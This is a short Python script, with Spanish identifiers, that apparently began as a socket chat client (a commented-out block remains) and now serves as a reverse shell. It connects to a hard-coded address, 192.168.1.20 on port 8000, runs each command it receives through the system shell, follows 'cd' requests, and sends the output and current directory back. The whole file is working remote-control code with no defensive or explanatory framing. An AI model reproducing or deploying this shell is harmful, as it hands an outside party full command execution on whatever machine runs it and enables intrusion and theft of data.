import socket
import os
import subprocess
import time

def Main():
    
    host = "192.168.1.20"
    puerto = 8000

    socket_cliente = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket_cliente.connect((host,puerto))
    """
    alias = input("Ingrese su nombre: ")

    mensaje = input(alias+" ->")

    while mensaje != "q":
        socket_cliente.sendto("{}->{}".format(alias,mensaje).encode("utf-8"),(host,puerto))
        mensaje = socket_cliente.recv(1024)
        print(mensaje.decode('ascii')) 
    """

    while True:
        data = socket_cliente.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            socket_cliente.send(str.encode(output_str + currentWD))
            print(output_str)


if __name__ == "__main__":
    Main()